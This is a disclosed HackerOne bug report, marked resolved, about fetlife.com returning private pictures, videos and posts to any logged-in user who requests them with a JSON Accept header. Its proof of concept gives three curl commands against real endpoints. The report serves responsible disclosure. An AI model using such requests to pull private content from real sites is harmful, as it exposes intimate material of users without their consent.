---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1424291'
original_report_id: '1424291'
title: Able to access private picture/video/writing when requesting for their JSON
  response
weakness: Information Disclosure
team_handle: fetlife
created_at: '2021-12-12T06:43:03.224Z'
disclosed_at: '2021-12-16T15:05:17.101Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 64
asset_identifier: fetlife.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Able to access private picture/video/writing when requesting for their JSON response

## Metadata

- HackerOne Report ID: 1424291
- Weakness: Information Disclosure
- Program: fetlife
- Disclosed At: 2021-12-16T15:05:17.101Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Description
Endpoint `https://fetlife.com/users/{user-id}/pictures/{pic-id}` has 2 types of responses, HTML and JSON. The type of response depends on `Accept`  header of request it get. If request contains `Accept: application/json`, then it will return JSON response. Other than that, it returns HTML response.

When this endpoint returns JSON response, it does not check if requester is authorized to access requested resource. Therefore, attacker can access any private picture by requesting them in JSON response.

# PoC
User `trieulieuf9` has the following private assets
**Picture**: https://fetlife.com/users/14104003/pictures/120041856
**Video**: https://fetlife.com/users/14104003/videos/3102890
**Post**: https://fetlife.com/users/14104003/posts/7673012

We can access them with the following `curl` commands
**Picture**: 
```
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```
**Video**:
```
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```
**Post**:
```
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

# Limitation
Attacker needs to know asset IDs before the attack.

## Impact

Attacker can access any private picture/video/post if he can somehow get their ID.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
